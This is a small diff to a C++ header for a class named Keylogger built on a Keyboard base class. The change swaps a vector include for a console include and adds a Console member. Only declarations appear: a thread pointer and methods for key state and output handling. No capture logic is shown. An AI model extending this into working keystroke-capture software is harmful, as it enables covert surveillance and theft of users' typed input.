@@ -1,13 +1,14 @@
 #pragma once
 #include <thread>
-#include <vector>
 #include <iostream>
 #include <locale>
 #include "keyboard.h"
+#include "console.h"
 
 class Keylogger : public Keyboard {
 private:
 	std::thread* keylog;
+	Console console;
 
 	void setKeysState();
 	void handleOutput();
